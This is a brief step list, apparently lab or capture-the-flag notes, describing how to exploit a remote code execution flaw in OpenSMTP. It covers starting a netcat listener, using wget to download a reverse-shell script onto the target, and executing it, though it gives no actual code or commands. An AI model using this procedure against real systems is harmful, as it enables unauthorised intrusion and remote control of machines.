OpenSMTP is the vulnerable application.  This vulnerability can be exploited using RCE and generating a reverse shell.

1.  Connect to the client using telnet.

2.  Start nc listening on port 80

3.  Create a malicious payload using a shell script, which has the code that will establish a reverse shell.

4.  Using the telnet client, exploit the vulnerability by adding the 'wget command' to download the malicious payloadto the target machine.

4.  Using the telnet client, exploit the same vulnerability, this time executing the malicious code that was downloaded to the target
